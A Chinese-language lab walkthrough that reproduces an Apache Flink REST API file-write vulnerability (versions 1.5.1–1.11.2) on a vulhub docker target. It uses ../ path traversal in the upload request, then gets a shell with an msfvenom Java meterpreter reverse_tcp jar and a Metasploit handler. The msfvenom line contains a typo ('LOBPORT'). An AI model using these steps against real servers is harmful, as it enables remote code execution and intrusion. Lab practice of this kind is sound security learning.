## 一、准备工作

复现此漏洞需要安装docker，下载安装docker-compose，搭建vulhub靶场，靶场需要能够访问外网（nat模式或桥接模式网卡与物理机共享网络）用于获取环境镜像，还需要用到kali，要确保攻击机与靶机之间网络要互通。

## 二、漏洞介绍

Apache
Flink是一个面向数据流处理和批量数据处理的可分布式的开源计算框架。它可以用来做批处理，即处理静态的数据集、历史的数据集；也可以用来做流处理，即实时地处理一些实时数据流，实时地产生数据的结果；也可以用来做一些基于事件的应用；该漏洞允许攻击者利用REST
API，并通过精心构造的HTTP Header，实现远程文件写入。

影响版本：Apache Flink: 1.5.1 —— 1.11.2

## 三、复现过程

首先，我们CD到该漏洞目录下启动漏洞环境

docker-compose up -d

![1652929091_6285b2432209b1bcc8193.png!small?1652929094153](https://image.3001.net/images/20220519/1652929091_6285b2432209b1bcc8193.png!small?1652929094153)

然后输入docker ps查看服务开启在哪个端口

docker ps

![1652929101_6285b24dac9edda0989d9.png!small?1652929104602](https://image.3001.net/images/20220519/1652929101_6285b24dac9edda0989d9.png!small?1652929104602)

访问<http://yourIP:8081>，可以查看到主页

![1652929108_6285b25467fba261cf846.png!small?1652929111325](https://image.3001.net/images/20220519/1652929108_6285b25467fba261cf846.png!small?1652929111325)

我们选择Submit New Job页面，点击Add New随便传个文件抓包

![1652929117_6285b25d7fa59684de978.png!small?1652929120447](https://image.3001.net/images/20220519/1652929117_6285b25d7fa59684de978.png!small?1652929120447)

jar包存放目录是/tmp/flink-web-UUID/flink-web-upload，所以我们修改上传路径

![1652929138_6285b272c4b1f6806db98.png!small?1652929141979](https://image.3001.net/images/20220519/1652929138_6285b272c4b1f6806db98.png!small?1652929141979)

虽然显示400但是实际上已经传上去了，
**如果报500的话说明你../的数量不够，没有到达该漏洞路径加减../来得到400的返还，直到报400且errors有一堆内容才算传上去了**
，我们回到虚机执行命令：

docker ps 来获取容器ID

![1652929241_6285b2d901dfeaa724996.png!small?1652929244016](https://image.3001.net/images/20220519/1652929241_6285b2d901dfeaa724996.png!small?1652929244016)

然后执行命令：

docker exec -it 容器ID /bin/bash 进入容器

cd /tmp 到/tmp目录下查看文件，可以看到上传成功了。

![1652929260_6285b2ec960953606d55d.png!small?1652929263859](https://image.3001.net/images/20220519/1652929260_6285b2ec960953606d55d.png!small?1652929263859)

## 四、Getshell

Flink支持上传jar包并且执行，所以可以通过上传jar包getshell，我们使用kali作为攻击机生成java执行木马：

LHOST：你的攻击机IP LOBPORT：你的攻击机任意未占用端口

msfvenom -p java/meterpreter/reverse_tcp LHOST=192.168.163.131 LOBPORT=61111
-f jar > test.jar

![1652929295_6285b30f2bbcccb5b3872.png!small?1652929298161](https://image.3001.net/images/20220519/1652929295_6285b30f2bbcccb5b3872.png!small?1652929298161)

然后配置一下监听：

msfconsole

use exploit/multi/handler

set payload java/shell/reverse_tcp

set LHOST 192.168.163.131

set LPORT 61111

run

![1652929304_6285b3183b8ae5d0effa8.png!small?1652929307201](https://image.3001.net/images/20220519/1652929304_6285b3183b8ae5d0effa8.png!small?1652929307201)

回到上传点，上传我们刚才kali生成的jar文件，然后运行

![1652929311_6285b31fecad9c7eef013.png!small?1652929314877](https://image.3001.net/images/20220519/1652929311_6285b31fecad9c7eef013.png!small?1652929314877)

成功拿到shell

![1652929320_6285b32882c1b1428b653.png!small?1652929323581](https://image.3001.net/images/20220519/1652929320_6285b32882c1b1428b653.png!small?1652929323581)

